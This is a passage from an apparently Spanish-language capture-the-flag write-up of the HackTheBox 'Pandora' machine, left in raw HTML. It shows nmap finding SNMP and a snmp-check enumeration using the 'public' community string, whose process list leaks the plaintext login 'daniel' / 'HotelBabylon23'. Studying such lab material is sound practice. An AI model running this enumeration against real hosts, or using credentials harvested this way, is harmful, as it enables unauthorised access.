Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.071s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; net-snmp SNMPv3 server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;public&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 1.66 seconds
 π ~/htb/pandora ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Antes de ejecutar alguna herramienta realizamos el &amp;lsquo;setup&amp;rsquo; como en &lt;a href=&#34;https://sckull.github.io/posts/pit/#setup&#34;&gt;Pit - HTB&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;snmp-check&#34;&gt;snmp-check&lt;/h2&gt;
&lt;p&gt;Ejecutamos &lt;code&gt;snmp-check&lt;/code&gt; con el &amp;lsquo;community string&amp;rsquo; &amp;ldquo;public&amp;rdquo; y version 1. Vemos informacion de la maquina, procesos, dispositivos, etc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;130
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;131
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;132
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;133
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;134
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;135
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;136
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;137
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;138
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;139
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;140
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;141
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;142
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;143
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;144
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;145
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;146
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;147
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;148
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;149
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;150
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;151
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;152
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;153
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;154
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;155
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;156
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;157
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;158
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;159
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;160
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;161
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;162
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;163
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ snmp-check -v &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -c public 10.10.11.136
snmp-check v1.9 - SNMP enumerator
Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 2005-2015 by Matteo Cantoni &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www.nothink.org&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Try to connect to 10.10.11.136:161 using SNMPv1 and community &lt;span class=&#34;s1&#34;&gt;&amp;#39;public&amp;#39;&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; System information:

  Host IP address               : 10.10.11.136
  Hostname                      : pandora
  Description                   : Linux pandora 5.4.0-91-generic &lt;span class=&#34;c1&#34;&gt;#102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64&lt;/span&gt;
  Contact                       : Daniel
  Location                      : Mississippi
  Uptime snmp                   : 05:15:39.42
  Uptime system                 : 05:15:28.82
  System date                   : 2022-1-30 02:57:15.0

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Network information:

  IP forwarding enabled         : no
  Default TTL                   : &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
  TCP segments received         : &lt;span class=&#34;m&#34;&gt;3601010&lt;/span&gt;
  TCP segments sent             : &lt;span class=&#34;m&#34;&gt;4101728&lt;/span&gt;
  TCP segments retrans          : &lt;span class=&#34;m&#34;&gt;38956&lt;/span&gt;
  Input datagrams               : &lt;span class=&#34;m&#34;&gt;3657936&lt;/span&gt;
  Delivered datagrams           : &lt;span class=&#34;m&#34;&gt;3657936&lt;/span&gt;
  Output datagrams              : &lt;span class=&#34;m&#34;&gt;3569337&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Network interfaces:

  Interface                     : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; up &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; lo
  Id                            : &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Mbps
  MTU                           : &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt;
  In octets                     : &lt;span class=&#34;m&#34;&gt;31804755&lt;/span&gt;
  Out octets                    : &lt;span class=&#34;m&#34;&gt;31804755&lt;/span&gt;

  Interface                     : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; up &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VMware VMXNET3 Ethernet Controller
  Id                            : &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
  Mac Address                   : 00:50:56:b9:5a:fe
  Type                          : ethernet-csmacd
  Speed                         : &lt;span class=&#34;m&#34;&gt;4294&lt;/span&gt; Mbps
  MTU                           : &lt;span class=&#34;m&#34;&gt;1500&lt;/span&gt;
  In octets                     : &lt;span class=&#34;m&#34;&gt;563888321&lt;/span&gt;
  Out octets                    : &lt;span class=&#34;m&#34;&gt;2227973757&lt;/span&gt;


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Network IP:

  Id                    IP Address            Netmask               Broadcast
  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;                     10.10.11.136          255.255.254.0         &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;                     127.0.0.1             255.0.0.0             &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Routing information:

  Destination           Next hop              Mask                  Metric
  0.0.0.0               10.10.10.2            0.0.0.0               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  10.10.10.0            0.0.0.0               255.255.254.0         &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State
  0.0.0.0               &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;                    0.0.0.0               &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;                     listen
  10.10.11.136          &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;                    10.10.14.11           &lt;span class=&#34;m&#34;&gt;39386&lt;/span&gt;                 established
  10.10.11.136          &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;                    10.10.14.16           &lt;span class=&#34;m&#34;&gt;54900&lt;/span&gt;                 timeWait
  10.10.11.136          &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;                    10.10.14.16           &lt;span class=&#34;m&#34;&gt;54902&lt;/span&gt;                 timeWait
  10.10.11.136          &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;                    10.10.14.16           &lt;span class=&#34;m&#34;&gt;54904&lt;/span&gt;                 timeWait
  10.10.11.136          &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;                    10.10.14.16           &lt;span class=&#34;m&#34;&gt;54910&lt;/span&gt;                 timeWait
  10.10.11.136          &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;                    10.10.14.16           &lt;span class=&#34;m&#34;&gt;54912&lt;/span&gt;                 timeWait
  10.10.11.136          &lt;span class=&#34;m&#34;&gt;35264&lt;/span&gt;                 1.1.1.1               &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;                    synSent
  127.0.0.1             &lt;span class=&#34;m&#34;&gt;3306&lt;/span&gt;                  0.0.0.0               &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;                     listen
  127.0.0.53            &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;                    0.0.0.0               &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;                     listen

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Listening UDP ports:

  Local address         Local port
  0.0.0.0               &lt;span class=&#34;m&#34;&gt;161&lt;/span&gt;
  127.0.0.53            &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Processes:

  Id                    Status                Name                  Path                  Parameters
  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;                     runnable              systemd               /sbin/init            maybe-ubiquity
  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;                     runnable              kthreadd
  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;                     unknown               rcu_gp
  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;                     unknown               rcu_par_gp
  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;                     unknown               kworker/0:0H-kblockd
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;768&lt;/span&gt;                   runnable              systemd-logind        /lib/systemd/systemd-logind
  &lt;span class=&#34;m&#34;&gt;771&lt;/span&gt;                   runnable              udisksd               /usr/lib/udisks2/udisksd
  &lt;span class=&#34;m&#34;&gt;841&lt;/span&gt;                   runnable              cron                  /usr/sbin/cron        -f
  &lt;span class=&#34;m&#34;&gt;843&lt;/span&gt;                   runnable              cron                  /usr/sbin/CRON        -f
  &lt;span class=&#34;m&#34;&gt;851&lt;/span&gt;                   runnable              sh                    /bin/sh               -c sleep 30&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /bin/bash -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/bin/host_check -u daniel -p HotelBabylon23&amp;#39;&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;866&lt;/span&gt;                   runnable              atd                   /usr/sbin/atd         -f
  &lt;span class=&#34;m&#34;&gt;872&lt;/span&gt;                   running               snmpd                 /usr/sbin/snmpd       -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
  &lt;span class=&#34;m&#34;&gt;873&lt;/span&gt;                   runnable              sshd                  sshd: /usr/sbin/sshd -D &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;listener&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; of 10-100 startups
  &lt;span class=&#34;m&#34;&gt;878&lt;/span&gt;                   runnable              apache2               /usr/sbin/apache2     -k start
  &lt;span class=&#34;m&#34;&gt;891&lt;/span&gt;                   runnable              agetty                /sbin/agetty          -o -p -- &lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt; --noclear tty1 linux
  &lt;span class=&#34;m&#34;&gt;966&lt;/span&gt;                   runnable              mysqld                /usr/sbin/mysqld
  &lt;span class=&#34;m&#34;&gt;980&lt;/span&gt;                   runnable              polkitd               /usr/lib/policykit-1/polkitd  --no-debug
  &lt;span class=&#34;m&#34;&gt;1216&lt;/span&gt;                  runnable              host_check            /usr/bin/host_check   -u daniel -p HotelBabylon23
  &lt;span class=&#34;m&#34;&gt;1293&lt;/span&gt;                  runnable              systemd               /lib/systemd/systemd  --user
  &lt;span class=&#34;m&#34;&gt;1295&lt;/span&gt;                  runnable              &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sd-pam&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;              &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sd-pam&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;16840&lt;/span&gt;                 runnable              gpg-agent             /usr/bin/gpg-agent    --supervised
  &lt;span class=&#34;m&#34;&gt;27670&lt;/span&gt;                 runnable              sshd                  sshd: daniel &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;priv&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;27752&lt;/span&gt;                 runnable              sshd                  sshd: daniel@pts/6
  &lt;span class=&#34;m&#34;&gt;27753&lt;/span&gt;                 runnable              bash                  -bash
  &lt;span class=&#34;m&#34;&gt;29891&lt;/span&gt;                 runnable              apache2               /usr/sbin/apache2     -k start
  &lt;span class=&#34;m&#34;&gt;30131&lt;/span&gt;                 runnable              apache2               /usr/sbin/apache2     -k start
  &lt;span class=&#34;m&#34;&gt;54083&lt;/span&gt;                 runnable              apache2               /usr/sbin/apache2     -k start
  &lt;span class=&#34;m&#34;&gt;54084&lt;/span&gt;                 runnable              apache2               /usr/sbin/apache2     -k start
  &lt;span class=&#34;m&#34;&gt;64341&lt;/span&gt;                 runnable              gpg-agent             gpg-agent             --homedir /home/matt/.gnupg --use-standard-socket --daemon
  &lt;span class=&#34;m&#34;&gt;77972&lt;/span&gt;                 runnable              apache2               /usr/sbin/apache2     -k start
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Storage information:

  Description                   : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Physical memory&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  Device id                     : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#&amp;lt;SNMP::Integer:0x000055bb8cd75cd8 @value=1&amp;gt;]&lt;/span&gt;
  Filesystem &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;               : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;unknown&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  Device unit                   : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#&amp;lt;SNMP::Integer:0x000055bb8cd6fe50 @value=1024&amp;gt;]&lt;/span&gt;
  Memory size                   : 3.84 GB
  Memory used                   : 2.23 GB

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

  Description                   : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/run/user/1001&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  Device id                     : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#&amp;lt;SNMP::Integer:0x000055bb8cd10e28 @value=64&amp;gt;]&lt;/span&gt;
  Filesystem &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;               : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;unknown&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  Device unit                   : &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#&amp;lt;SNMP::Integer:0x000055bb8cd0f208 @value=4096&amp;gt;]&lt;/span&gt;
  Memory size                   : 393.61 MB
  Memory used                   : &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; bytes


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; File system information:

  Index                         : noSuchInstance
  Mount point                   : noSuchInstance
  Access                        : noSuchInstance
  Bootable                      : noSuchInstance

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Device information:

  Id                    Type                  Status                Descr
  &lt;span class=&#34;m&#34;&gt;196608&lt;/span&gt;                unknown               running               GenuineIntel: Intel&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Xeon&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Gold &lt;span class=&#34;m&#34;&gt;5218&lt;/span&gt; CPU @ 2.30GHz
  &lt;span class=&#34;m&#34;&gt;196609&lt;/span&gt;                unknown               running               GenuineIntel: Intel&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Xeon&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Gold &lt;span class=&#34;m&#34;&gt;5218&lt;/span&gt; CPU @ 2.30GHz
  &lt;span class=&#34;m&#34;&gt;262145&lt;/span&gt;                unknown               running               network interface lo
  &lt;span class=&#34;m&#34;&gt;262146&lt;/span&gt;                unknown               running               network interface eth0
  &lt;span class=&#34;m&#34;&gt;786432&lt;/span&gt;                unknown               unknown               Guessing that there&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s a floating point co-processor

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Software components:

  Index                 Name
  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;                     accountsservice_0.6.55-0ubuntu12~20.04.5_amd64
  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;                     adduser_3.118ubuntu2_all
  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;                     alsa-topology-conf_1.2.2-1_all
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;819&lt;/span&gt;                   zip_3.0-11build1_amd64
